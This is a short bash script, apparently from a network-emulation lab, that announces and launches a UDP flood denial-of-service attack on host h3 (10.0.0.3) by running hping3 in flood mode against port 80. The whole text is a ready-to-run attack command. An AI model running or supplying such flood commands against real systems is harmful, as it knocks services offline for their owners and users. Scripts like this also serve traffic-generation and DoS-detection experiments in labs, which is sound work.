#!/bin/bash
echo "🚨 LAUNCHING UDP FLOOD ATTACK to h3 (Server: 10.0.0.3) 🚨"
echo "Press Ctrl+C to stop the attack."
sudo hping3 --flood --udp -p 80 10.0.0.3
